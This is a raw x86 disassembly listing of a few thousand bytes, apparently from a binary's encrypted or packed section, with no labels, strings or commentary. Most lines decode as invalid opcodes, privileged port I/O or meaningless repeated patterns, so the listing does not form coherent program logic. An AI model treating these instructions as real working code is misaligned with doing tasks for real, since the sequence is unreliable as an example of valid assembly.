  4254e2:	mov    eax,DWORD PTR [eax-0x687f7510]
  4254e8:	mov    dl,BYTE PTR [ebx-0x3]
  4254eb:	push   ebx
  4254ec:	pushf  
  4254ed:	mov    dl,0xbe
  4254ef:	or     al,0xb2
  4254f1:	clc    
  4254f2:	sub    edi,edi
  4254f4:	(bad)  
  4254f5:	in     al,dx
  4254f6:	add    eax,0x80c8f080
  4254fb:	xchg   edi,eax
  4254fc:	enter  0x9c53,0x53
  425500:	std    
  425501:	mov    dl,0xf8
  425503:	sub    DWORD PTR [edx-0x100f342],esi
  425509:	adc    BYTE PTR [edi-0x75587f76],0x53
  425510:	not    DWORD PTR [ebx-0x54]
  425513:	mov    dl,0xb4
  425515:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  42551b:	inc    ebx
  42551c:	(bad)  
  42551d:	arpl   WORD PTR ds:0x4d5b4c09,ax
  425523:	dec    ebp
  425524:	dec    ebp
  425525:	xor    BYTE PTR [edi-0x75],0x80
  425529:	lock out dx,eax
  42552b:	stos   DWORD PTR es:[edi],eax
  42552c:	test   eax,0x77803a50
  425531:	mov    esp,DWORD PTR [ebx-0x72110490]
  425537:	xchg   edi,eax
  425538:	add    BYTE PTR [edi+0x70539696],0x5f
  42553f:	lock and ebp,edx
  425542:	in     eax,0x5f
  425544:	lock out dx,eax
  425546:	(bad)  
  425548:	(bad)  
  425549:	out    dx,al
  42554a:	outs   dx,BYTE PTR ds:[esi]
  42554b:	adc    BYTE PTR [edi+0x9],dh
  42554e:	cld    
  42554f:	ja     0x42551d
  425551:	aad    0xfc
  425553:	ja     0x425562
  425555:	sbb    esp,edi
  425557:	ja     0x4255a6
  425559:	ror    BYTE PTR [ecx],1
  42555b:	loopne 0x4255d4
  42555d:	dec    ebp
  42555e:	or     eax,esp
  425560:	xchg   edi,eax
  425561:	or     eax,0x8d8d7acf
  425566:	lea    esi,[ebx]
  425568:	sti    
  425569:	or     eax,esp
  42556b:	xchg   edi,eax
  42556c:	int3   
  42556d:	xor    edi,ebx
  42556f:	adc    BYTE PTR [edi-0x7b],dh
  425572:	cld    
  425573:	ja     0x42557b
  425575:	or     eax,0xd48a77fc
  42557a:	cld    
  42557b:	ja     0x4255ca
  42557d:	jl     0x42557b
  42557f:	ja     0x42558e
  425581:	sar    esp,cl
  425583:	ja     0x425551
  425585:	push   esp
  425586:	(bad)  
  425587:	ja     0x425555
  425589:	(bad)  
  42558a:	xchg   edi,eax
  42558b:	or     eax,0x978ffba6
  425590:	dec    ebp
  425591:	sar    bl,cl
  425593:	(bad)  
  425594:	xchg   edi,eax
  425595:	mov    cl,BYTE PTR [ebx]
  425597:	pop    es
  425598:	(bad)  
  425599:	xchg   edi,eax
  42559a:	push   es
  42559b:	sar    bl,cl
  42559d:	(bad)  
  42559e:	xchg   edi,eax
  42559f:	test   esi,edx
  4255a1:	neg    ebx
  4255a3:	or     DWORD PTR [ecx],ecx
  4255a5:	loopne 0x42561e
  4255a7:	or     DWORD PTR [edi+0x8],eax
  4255aa:	lea    ecx,[ebp+0x977108d]
  4255b0:	div    eax
  4255b2:	or     DWORD PTR [edi-0x11eff689],ecx
  4255b8:	outs   dx,BYTE PTR ds:[esi]
  4255b9:	xchg   edx,eax
  4255ba:	arpl   ax,si
  4255bc:	out    dx,eax
  4255bd:	in     al,0x50
  4255bf:	dec    ebp
  4255c0:	xlat   BYTE PTR ds:[ebx]
  4255c1:	out    dx,eax
  4255c2:	cdq    
  4255c3:	xchg   BYTE PTR [edx-0x76],cl
  4255c6:	dec    ebp
  4255c7:	dec    ebp
  4255c8:	jo     0x4255c5
  4255ca:	out    dx,eax
  4255cb:	lea    edx,[edi-0x785d7880]
  4255d1:	cmp    eax,0x938d8dee
  4255d6:	cdq    
  4255d7:	mul    BYTE PTR fs:[edi+ebp*2]
  4255db:	cmp    BYTE PTR [eax-0x59],dl
  4255de:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  4255e2:	cmc    
  4255e3:	and    al,0x6f
  4255e5:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  4255e9:	imul   BYTE PTR [edi+ebp*2]
  4255ec:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  4255f0:	xchg   esi,eax
  4255f1:	mov    ch,0xcb
  4255f3:	scas   al,BYTE PTR es:[edi]
  4255f4:	xor    BYTE PTR [edi+0x32],0x80
  4255f8:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  4255ff:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  425605:	mov    dl,0x86
  425607:	or     al,0xb2
  425609:	mov    edx,0x50b2ff29
  42560e:	ja     0x42559b
  425610:	jl     0x425689
  425612:	sbb    esp,0x24
  425615:	outs   dx,DWORD PTR ds:[esi]
  425616:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  42561a:	inc    edi
  42561b:	sbb    al,0xf9
  42561d:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  425621:	out    dx,eax
  425622:	lea    ecx,[ebp-0x7f8f7f73]
  425628:	ja     0x4255b4
  42562a:	xor    al,0x8a
  42562d:	push   ebx
  42562e:	sub    dh,BYTE PTR [edx-0x3acd646]
  425634:	mov    dl,0x86
  425636:	or     al,0xff
  425638:	mov    dl,0x80
  42563a:	lock xor al,BYTE PTR [eax+0x51533297]
  425641:	push   ebx
  425642:	pushf  
  425643:	mov    dl,0xbe
  425645:	or     al,0xb2
  425647:	clc    
  425648:	sub    edi,edi
  42564a:	dec    BYTE PTR [ecx]
  42564c:	and    dh,BYTE PTR [edx+0x778092c4]
  425652:	enter  0xf080,0xc8
  425656:	mov    dl,0x86
  425658:	sub    DWORD PTR [edx-0x4d00f346],esi
  42565e:	push   ebx
  42565f:	je     0x4256b1
  425661:	ja     0x4255ee
  425663:	add    DWORD PTR [edi-0x75],esi
  425666:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42566c:	push   eax
  42566d:	ja     0x4255fa
  42566f:	xor    BYTE PTR [edi-0x75],0x80
  425673:	lock enter 0xf50,0x1
  425678:	add    BYTE PTR [esi],0x4d
  42567b:	dec    ebp
  42567c:	xor    BYTE PTR [edi-0x76],0x80
  425680:	lock mov dl,BYTE PTR [ebx-0x4]
  425684:	push   ebx
  425685:	sub    dh,BYTE PTR [edx-0x454df37a]
  42568b:	sub    edi,edi
  42568d:	mov    dl,0xec
  42568f:	ja     0x425659
  425691:	push   eax
  425692:	ja     0x42565c
  425694:	xor    BYTE PTR [edi-0x79],0x80
  425698:	lock xchg DWORD PTR [ebx+0x2a],edx
  42569c:	mov    dl,0xba
  42569e:	sub    DWORD PTR [ebx-0x4],edx
  4256a1:	mov    dl,0x86
  4256a3:	or     al,0xff
  4256a5:	mov    dl,0x80
  4256a7:	lock mov al,BYTE PTR [eax+0x51538a97]
  4256ae:	push   ebx
  4256af:	pushf  
  4256b0:	mov    dl,0xbe
  4256b2:	or     al,0xb2
  4256b4:	clc    
  4256b5:	sub    edi,edi
  4256b7:	inc    BYTE PTR [ebx-0x4e]
  4256ba:	xor    al,0xc8
  4256bd:	arpl   bp,di
  4256bf:	fstp   DWORD PTR [edx]
  4256c1:	xor    BYTE PTR [edi-0x7],0x80
  4256c5:	lock stc 
  4256c7:	push   ebx
  4256c8:	cld    
  4256c9:	push   ebx
  4256ca:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256d0:	sub    edi,edi
  4256d2:	mov    dl,0x50
  4256d4:	ja     0x425661
  4256d6:	jl     0x42574f
  4256d8:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  4256de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256df:	mov    esi,0x8d8d8dcd
  4256e4:	xor    al,0x83
  4256e7:	xor    BYTE PTR [edi-0x7d],0x53
  4256eb:	jl     0x42569f
  4256ed:	test   BYTE PTR [ecx],ch
  4256ef:	push   ebx
  4256f0:	push   ecx
  4256f1:	mov    dl,0xbe
  4256f3:	or     al,0xff
  4256f5:	std    
  4256f6:	xor    BYTE PTR [edi-0x75],0x94
  4256fa:	xchg   BYTE PTR [eax+0x77],dl
  4256fd:	add    BYTE PTR [eax-0x72701089],0x10
  425704:	ja     0x4256ca
  425706:	(bad)  
  425707:	ja     0x4256cd
  425709:	xor    al,0x8b
  42570c:	or     eax,esp
  42570e:	push   0x53
  425710:	mov    dl,0x50
  425712:	ja     0x4256dc
  425714:	xor    BYTE PTR [edi-0x79],0x80
  425718:	lock xchg DWORD PTR [ebx-0x4],edx
  42571c:	mov    dl,0x86
  42571e:	or     al,0x53
  425720:	sub    dh,BYTE PTR [edx-0x4d00d646]
  425726:	xor    al,0xc8
  425729:	xor    esi,DWORD PTR [edx-0x7db0f080]
  42572f:	push   es
  425730:	dec    ebp
  425731:	dec    ebp
  425732:	xor    al,0x82
  425735:	push   ebx
  425736:	mov    dl,0x50
  425738:	ja     0x4256c5
  42573a:	xor    BYTE PTR [edi-0x76],0x80
  42573e:	lock mov dl,BYTE PTR [ebx-0x4]
  425742:	push   ebx
  425743:	sub    dh,BYTE PTR [edx-0x454df37a]
  425749:	sub    edi,edi
  42574b:	mov    dl,0x3a
  42574d:	ja     0x42573e
  42574f:	xor    BYTE PTR [edi-0x76],0x80
  425753:	lock mov dl,BYTE PTR [ebx-0x4]
  425757:	push   ebx
  425758:	sub    dh,BYTE PTR [edx-0x454df37a]
  42575e:	sub    edi,edi
  425760:	mov    dl,0x3f
  425762:	ja     0x4256e8
  425764:	xor    BYTE PTR [edi+0x32],0x80
  425768:	lock xor dl,BYTE PTR [ebx+0x2a]
  42576c:	push   ebx
  42576d:	cld    
  42576e:	mov    dl,0xba
  425770:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425776:	xor    al,0x84
  425779:	arpl   bp,di
  42577b:	or     DWORD PTR [edi-0x4d],ecx
  42577e:	dec    ebp
  42577f:	dec    ebp
  425780:	dec    ebp
  425781:	xor    BYTE PTR [edi-0x7],0x80
  425785:	lock stc 
  425787:	push   ebx
  425788:	cld    
  425789:	push   ebx
  42578a:	sub    dh,BYTE PTR [edx-0x794dd646]
  425790:	or     al,0xab
  425792:	push   DWORD PTR [edx-0x56740f80]
  425798:	push   ebx
  425799:	mov    dl,0xa3
  42579b:	jo     0x425798
  42579d:	out    dx,al
  42579e:	lea    edx,[edi-0x78127880]
  4257a4:	jno    0x4257f9
  4257a6:	jo     0x42573b
  4257a8:	fwait
  4257a9:	pop    edi
  4257aa:	lock out dx,eax
  4257ac:	or     DWORD PTR [edi],ecx
  4257ae:	pop    esp
  4257af:	lea    ecx,[ebp+0x905638d]
  4257b5:	mov    cr1,ebp
  4257b8:	lea    ecx,[ebp+0x2d995c09]
  4257be:	pop    esi
  4257bf:	and    al,0x38
  4257c1:	lea    ecx,[ebp+0x508af050]
  4257c7:	lock xor dl,BYTE PTR [ebx-0x9]
  4257cb:	push   eax
  4257cc:	lock mov edi,DWORD PTR [ecx-0x49460180]
  4257d3:	jo     0x425828
  4257d5:	dec    ebp
  4257d6:	jl     0x42584f
  4257d8:	enter  0x4d07,0x4d
  4257dc:	dec    ebp
  4257dd:	mov    ecx,0xc5d3cb63
  4257e2:	mov    ecx,0xb98ae780
  4257e7:	mov    dh,0x7c
  4257e9:	mov    ecx,0x5c098b53
  4257ee:	lock mov eax,DWORD PTR [ecx]
  4257f1:	and    esp,ebx
  4257f3:	mov    ecx,0xd70cdf5f
  4257f8:	pop    ebx
  4257f9:	or     DWORD PTR [eax+esi*1+0x50],ebx
  4257fd:	lock enter 0x63b9,0xfd
  425802:	xlat   BYTE PTR ds:[ebx]
  425803:	iret   
  425804:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425808:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  42580f:	aad    0x53
  425811:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425815:	and    BYTE PTR [edi-0x5f64611],0x21
  42581c:	pop    ds
  42581d:	mov    ecx,0x53b9b2b6
  425822:	std    
  425823:	mov    ecx,0xd5c8f05f
  425828:	and    edi,DWORD PTR [edi+esi*2-0x38]
  42582c:	xchg   BYTE PTR [ebp+0x4d],cl
  42582f:	dec    ebp
  425830:	dec    ebp
  425831:	ja     0x4257be
  425833:	cmp    ch,0xb9
  425836:	push   ebx
  425837:	mov    cl,0x2d
  425839:	mov    ecx,0x5fb970b6
  42583e:	lock mov esp,esp
  425841:	cmc    
  425842:	les    esp,FWORD PTR [esi+0x7c32774d]
  425848:	ja     0x425812
  42584a:	mov    esi,0x94d4d4d
  42584f:	pop    esp
  425850:	out    0x8a,eax
  425852:	and    BYTE PTR [edi+0x5d7053ef],0x21
  425859:	sub    edx,ebp
  42585b:	pop    ss
  42585c:	dec    ebp
  42585d:	ja     0x4257e9
  42585f:	in     eax,dx
  425860:	out    0xc8,eax
  425862:	xchg   BYTE PTR [ecx],cl
  425864:	dec    edi
  425865:	ror    BYTE PTR [ebp+0x4d],1
  425868:	dec    ebp
  425869:	push   ebx
  42586a:	push   0xffffffab
  42586c:	mov    ds:0x8deefb70,eax
  425871:	xor    al,0x32
  425874:	mov    ecx,0x53b9b2b6
  425879:	std    
  42587a:	push   ebx
  42587b:	push   0xffffffb9
  42587d:	arpl   WORD PTR [ecx+0x6a16092d],si
  425883:	les    eax,FWORD PTR [edx]
  425885:	xchg   edi,eax
  425886:	add    BYTE PTR [edi-0x6c427813],0x99
  42588d:	fwait
  42588e:	loop   0x4258d5
  425890:	dec    ebp
  425891:	xlat   BYTE PTR ds:[ebx]
  425892:	out    dx,eax
  425893:	xor    BYTE PTR [edx],0x86
  425896:	inc    ebx
  425897:	mov    ecx,DWORD PTR [ebp+0x4d]
  42589a:	add    DWORD PTR [ecx-0x40],edi
  42589d:	push   eax
  42589e:	ja     0x4258c6
  4258a0:	add    DWORD PTR [ecx+0x75],edi
  4258a3:	push   eax
  4258a4:	ja     0x4258d4
  4258a6:	add    DWORD PTR [ecx-0x47],edi
  4258a9:	push   eax
  4258aa:	ja     0x4258e2
  4258ac:	add    DWORD PTR [eax+edx*1-0x73],ecx
  4258b0:	lea    ecx,[ebp+0x13e7750]
  4258b6:	dec    esp
  4258b7:	cmc    
  4258b8:	lea    ecx,[ebp+0x4677508d]
  4258be:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  4258c2:	lea    ecx,[ebp+0x1627750]
  4258c8:	dec    esp
  4258c9:	mov    BYTE PTR [ebp+0x77508d8d],cl
  4258cf:	push   esi
  4258d0:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  4258d4:	lea    ecx,[ebp+0x15e7750]
  4258da:	dec    esp
  4258db:	aam    0x3a
  4258dd:	lea    ecx,[ebp+0x50667750]
  4258e3:	xlat   BYTE PTR ds:[ebx]
  4258e4:	push   ds
  4258e5:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  4258e9:	lea    ecx,[ebp-0x7f9588b0]
  4258ef:	dec    esp
  4258f0:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  4258f7:	jb     0x425949
  4258f9:	xchg   edi,eax
  4258fa:	not    DWORD PTR [eax-0x69]
  4258fd:	jp     0x42594f
  4258ff:	xchg   edi,eax
  425900:	adc    BYTE PTR [eax-0x69],0x83
  425904:	jl     0x42597d
  425906:	std    
  425907:	(bad)  [esi-0x79a1ee21]
  42590d:	pop    DWORD PTR [ebx+0x26]
  425910:	push   eax
  425911:	ja     0x4258c2
  425913:	xor    al,0xfd
  425916:	and    bh,0xaf
  425919:	push   ebx
  42591a:	mov    esp,DWORD PTR [edx-0x20a724fb]
  425920:	adc    DWORD PTR [ecx],ecx
  425922:	inc    esi
  425923:	retf   
  425924:	or     al,0xb2
  425926:	popa   
  425927:	or     al,0x50
  425929:	out    0xf9,eax
  42592b:	and    bh,0xfd
  42592e:	and    BYTE PTR [edi+0x53ac80af],0x4d
  425935:	push   ebx
  425936:	test   DWORD PTR [edx+0x2aff29b4],esi
  42593c:	and    bh,0xf9
  42593f:	icebp  
  425940:	lea    ecx,[ebp+0x353cd8d]
  425946:	inc    DWORD PTR [esi]
  425948:	jmp    FWORD PTR [edx]
  42594a:	push   eax
  42594b:	xlat   BYTE PTR ds:[ebx]
  42594c:	mov    ecx,DWORD PTR [ecx]
  42594e:	(bad)  
  425950:	lea    ecx,[ebp-0x8885d73]
  425956:	rcr    ebp,0x86
  425959:	outs   dx,DWORD PTR ds:[esi]
  42595a:	pusha  
  42595b:	mov    esi,0xe26438f
  425960:	lock jp 0x425905
  425963:	ja     0x4258e7
  425965:	rcr    ebp,0x52
  425968:	or     al,0xe
  42596a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425972:	and    bh,0xfd
  425975:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42597c:	fistp  DWORD PTR [eax-0x21]
  42597f:	adc    DWORD PTR [ecx],ecx
  425981:	inc    esi
  425982:	add    eax,0x29bcb20c
  425987:	mov    dl,0x88
  425989:	or     al,0x53
  42598b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42598c:	push   ebx
  42598d:	test   edi,edi
  42598f:	adc    edi,edi
  425991:	dec    ebx
  425992:	in     eax,dx
  425993:	mov    dl,0x4d
  425995:	in     eax,dx
  425996:	jle    0x4259e5
  425998:	push   eax
  425999:	lock std 
  42599b:	push   eax
  42599c:	xlat   BYTE PTR ds:[ebx]
  42599d:	scas   eax,DWORD PTR es:[edi]
  42599e:	xor    al,0xf7
  4259a1:	push   eax
  4259a3:	jp     0x42597a
  4259a5:	and    esp,DWORD PTR [edx+0x36ff777]
  4259ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259ac:	retf   
  4259ad:	pusha  
  4259ae:	sbb    edi,edx
  4259b0:	jp     0x425965
  4259b2:	push   cs
  4259b3:	lock jp 0x425958
  4259b6:	ja     0x42593a
  4259b8:	sti    
  4259b9:	jl     0x425997
  4259bb:	int3   
  4259bc:	push   cs
  4259bd:	lock add esp,0x1d
  4259c1:	mov    ds:0xddc1f7f0,al
  4259c6:	xchg   BYTE PTR [ecx+0x30],bh
  4259c9:	ja     0x425a45
  4259cb:	mov    ds:0xddc182b7,al
  4259d0:	push   edx
  4259d1:	jmp    0x438f:0xbe83b7a2
  4259d8:	es xor al,0xfd
  4259dc:	xor    al,0xaf
  4259df:	and    bh,0xfd
  4259e2:	and    BYTE PTR [edi+0x63609af],0xc
  4259e9:	mov    dl,0xbe
  4259eb:	sub    DWORD PTR [ebx+0xb],edx
  4259ee:	inc    esi
  4259f0:	mov    dl,0xbc
  4259f2:	or     al,0xff
  4259f4:	sub    ah,BYTE PTR [edx-0x20a726fb]
  4259fa:	adc    DWORD PTR [eax-0x10],edx
  4259fd:	std    
  4259fe:	push   ebx
  4259ff:	xor    dl,BYTE PTR [eax-0x29]
  425a02:	scas   eax,DWORD PTR es:[edi]
  425a03:	xor    al,0xfd
  425a06:	adc    bh,0xaf
  425a09:	and    bh,0xfd
  425a0c:	and    BYTE PTR [edi-0x5dcdac51],0x5
  425a13:	fistp  DWORD PTR [eax-0x21]
  425a16:	adc    DWORD PTR [ecx],ecx
  425a18:	inc    esi
  425a19:	add    eax,0x29bcb20c
  425a1e:	mov    dl,0x88
  425a20:	or     al,0x53
  425a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a23:	push   ebx
  425a24:	test   edi,edi
  425a26:	adc    edi,edi
  425a28:	dec    ebx
  425a29:	call   DWORD PTR [ecx+0x9]
  425a2c:	dec    edi
  425a2d:	ror    BYTE PTR [ebp+0x4d],0x4d
  425a31:	adc    bh,0x8b
  425a34:	dec    edi
  425a35:	or     ecx,DWORD PTR [ecx]
  425a37:	mov    cr1,ebp
  425a3a:	lea    ecx,[ebp-0x7f9a8680]
  425a40:	in     eax,0x81
  425a42:	fucomp st(4)
  425a44:	or     eax,0x80359b80
  425a49:	leave  
  425a4a:	and    eax,0x802d7b80
  425a4f:	stos   DWORD PTR es:[edi],eax
  425a50:	sbb    eax,0x97507eec
  425a55:	scas   eax,DWORD PTR es:[edi]
  425a56:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  425a5d:	push   eax
  425a5e:	lock xchg DWORD PTR [eax+0x77],edx
  425a62:	jp     0x425ab4
  425a64:	xchg   edi,eax
  425a65:	enter  0x9463,0xdb
  425a69:	in     al,dx
  425a6a:	push   eax
  425a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a6c:	enter  0x7253,0x50
  425a70:	xchg   edi,eax
  425a71:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a75:	(bad)  
  425a77:	(bad)  
  425a78:	in     al,dx
  425a79:	xor    BYTE PTR [edi+0x7a],0x80
  425a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a7e:	scas   eax,DWORD PTR es:[edi]
  425a7f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425a83:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425a89:	stos   DWORD PTR es:[edi],eax
  425a8a:	adc    eax,0xee80a9d3
  425a8f:	pop    edx
  425a90:	adc    BYTE PTR [edi+0x202580ef],0x50
  425a97:	xchg   edi,eax
  425a98:	mov    ch,ah
  425a9a:	cld    
  425a9b:	add    DWORD PTR [edi+0x4304ec1e],edx
  425aa1:	xchg   edi,eax
  425aa2:	out    dx,eax
  425aa3:	push   eax
  425aa4:	ja     0x425ad8
  425aa6:	push   eax
  425aa7:	xchg   edi,eax
  425aa8:	jbe    0x425b26
  425aaa:	ja     0x425aa5
  425aac:	dec    DWORD PTR [ebp-0x687f7273]
  425ab2:	mov    ch,ch
  425ab4:	(bad)  
  425ab5:	(bad)  
  425ab6:	xlat   BYTE PTR ds:[ebx]
  425ab7:	sub    DWORD PTR [edx],ecx
  425ab9:	xor    BYTE PTR [edi+0x76],0x80
  425abd:	push   ebp
  425abe:	jno    0x425a46
  425ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac1:	mov    cl,BYTE PTR [ebp+0x4d]
  425ac4:	adc    bh,0x8b
  425ac7:	xor    al,0x87
  425aca:	dec    edi
  425acb:	push   0xffffffd5
  425acd:	das    
  425ace:	xor    BYTE PTR [edi-0x76],0x50
  425ad2:	sbb    eax,0xed327780
  425ad7:	ja     0x425a63
  425ad9:	out    dx,al
  425ada:	dec    ebp
  425adb:	lock stc 
  425add:	xlat   BYTE PTR ds:[ebx]
  425ade:	mov    dh,0x80
  425ae0:	xchg   edi,eax
  425ae1:	sbb    eax,0x50
  425ae4:	xchg   edi,eax
  425ae5:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425ae9:	in     al,0xdc
  425aeb:	stos   DWORD PTR es:[edi],eax
  425aec:	cmp    ah,0xa9
  425aef:	mov    ds:0x8deefb70,eax
  425af4:	xchg   edi,eax
  425af5:	add    BYTE PTR [edi-0x10287f67],0x4d
  425afc:	loopne 0x425b30
  425afe:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425b04:	xchg   ch,ah
  425b06:	int3   
  425b07:	dec    ebp
  425b08:	dec    ebp
  425b09:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425b0e:	lea    edx,[ebx+0x70]
  425b11:	pop    edi
  425b12:	out    dx,eax
  425b13:	test   eax,0x80b21809
  425b18:	mov    dl,0xa7
  425b1a:	sti    
  425b1b:	out    dx,al
  425b1c:	lea    eax,[eax-0x72c5e1e4]
  425b22:	lea    edx,[ebx+0x5e328099]
  425b28:	and    al,0x38
  425b2a:	lea    ecx,[ebp-0x2ac5e3c]
  425b30:	mov    ecx,0x50b970b6
  425b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b36:	in     eax,dx
  425b37:	sti    
  425b38:	or     al,0xed
  425b3a:	cld    
  425b3b:	or     al,0x9
  425b3d:	pop    esp
  425b3e:	mov    eax,ds:0xd7fd63b9
  425b43:	pop    es
  425b44:	push   ebx
  425b45:	push   0xffffffa9
  425b47:	mov    ecx,0xce800c50
  425b4c:	push   ds
  425b4d:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425b53:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425b5a:	lea    esi,[edx+0x7cec6fbc]
  425b60:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b66:	mov    esi,0x6def10bd
  425b6b:	fmul   DWORD PTR [edi-0x7934325a]
  425b71:	xlat   BYTE PTR ds:[ebx]
  425b72:	popa   
  425b73:	cld    
  425b74:	lea    ecx,[ebp+0x3a1e4c80]
  425b7a:	lea    ecx,[ebp+0x74ab7cec]
  425b80:	xchg   edi,eax
  425b81:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425b88:	lea    edx,[ebx+0x438f8660]
  425b8e:	es cdq 
  425b90:	fwait
  425b91:	jl     0x425c0a
  425b93:	enter  0x58e4,0xdf
  425b97:	adc    DWORD PTR [eax-0x10],edx
  425b9a:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425b9e:	fstp   DWORD PTR [eax-0x21]
  425ba1:	adc    DWORD PTR [eax-0x10],edx
  425ba4:	xor    dl,BYTE PTR [ebx+0x6a]
  425ba7:	jl     0x425c20
  425ba9:	xchg   dh,dh
  425bab:	and    al,0x6f
  425bad:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425bb1:	cmc    
  425bb2:	and    al,0x6f
  425bb4:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425bb8:	call   0x50543b15
  425bbd:	lock jp 0x425c3c
  425bc0:	ja     0x425c20
  425bc2:	out    0x58,al
  425bc4:	fist   WORD PTR [ecx]
  425bc6:	push   eax
  425bc7:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425bcd:	xchg   edi,eax
  425bce:	xor    cl,BYTE PTR [ecx]
  425bd0:	inc    esi
  425bd1:	test   DWORD PTR [edx+esi*4],0x97800c07
  425bd8:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425bde:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425be2:	add    al,0xd4
  425be4:	push   ebx
  425be5:	jl     0x425c3a
  425be7:	or     edi,edi
  425be9:	cld    
  425bea:	push   eax
  425beb:	ja     0x425b70
  425bed:	add    DWORD PTR [edi-0x7c],esi
  425bf0:	push   eax
  425bf1:	ja     0x425ba2
  425bf3:	xor    BYTE PTR [edi-0x51],0xfa
  425bf7:	and    ah,BYTE PTR [edi+ebp*2]
  425bfa:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425bfe:	pop    eax
  425bff:	fist   WORD PTR [ecx]
  425c01:	push   eax
  425c02:	jge    0x425bf2
  425c04:	xor    al,0x8a
  425c07:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425c0e:	or     al,0xe2
  425c10:	or     eax,0xb2f7539d
  425c15:	clc    
  425c16:	sub    edi,edi
  425c18:	inc    BYTE PTR [eax-0x587f7569]
  425c1e:	mov    dl,BYTE PTR [ebx+0x7e]
  425c21:	mov    dl,0x7
  425c23:	or     al,0x53
  425c25:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c2c:	inc    BYTE PTR [eax-0x587f7569]
  425c32:	mov    dl,BYTE PTR [ebx+0x7e]
  425c35:	mov    dl,0x7
  425c37:	or     al,0x53
  425c39:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c40:	inc    BYTE PTR [eax-0x587f7569]
  425c46:	mov    dl,BYTE PTR [ebx+0x7e]
  425c49:	mov    dl,0x7
  425c4b:	or     al,0x53
  425c4d:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c54:	(bad)  
  425c55:	push   eax
  425c56:	add    DWORD PTR [edx+0x4d],edx
  425c59:	dec    ebp
  425c5a:	dec    ebp
  425c5b:	xor    al,0x86
  425c5e:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c65:	mov    dl,0xf8
  425c67:	sub    DWORD PTR [edx-0x100f342],esi
  425c6d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c74:	jle    0x425cc9
  425c76:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c7d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c84:	dec    ebp
  425c85:	dec    ebp
  425c86:	xor    al,0x21
  425c89:	xor    BYTE PTR [eax],0x80
  425c8c:	xchg   edi,eax
  425c8d:	mov    al,BYTE PTR [eax+0x7f808aa7]
  425c93:	or     dl,BYTE PTR [ebx-0x7e]
  425c96:	push   ebx
  425c97:	jle    0x425c4b
  425c99:	pop    es
  425c9a:	or     al,0xb2
  425c9c:	mov    ah,0x29
  425c9e:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425ca5:	dec    ebp
  425ca6:	dec    ebp
  425ca7:	xor    al,0x71
  425caa:	adc    BYTE PTR [edi+0x53f75371],0x51
  425cb1:	mov    dl,0xf8
  425cb3:	sub    DWORD PTR [edx-0x100f342],esi
  425cb9:	adc    BYTE PTR [edi-0x75587f76],0x53
  425cc0:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425cc7:	pop    es
  425cc8:	or     al,0xb2
  425cca:	mov    ah,0x29
  425ccc:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425cd3:	mov    dl,0x86
  425cd5:	or     al,0xed
  425cd7:	(bad)  
  425cd8:	or     eax,0xff29b4b2
  425cdd:	je     0x425ccb
  425cdf:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425ce9:	dec    ebp
  425cea:	xor    al,0x15
  425ced:	in     eax,dx
  425cee:	add    eax,0x29bab20d
  425cf3:	push   ebx
  425cf4:	cld    
  425cf5:	mov    dl,0x86
  425cf7:	or     al,0xff
  425cf9:	mov    dl,0x80
  425cfb:	lock mov al,BYTE PTR [eax-0x3d127569]
  425d02:	or     eax,0xf8b25153
  425d07:	sub    DWORD PTR [edx-0x100f342],esi
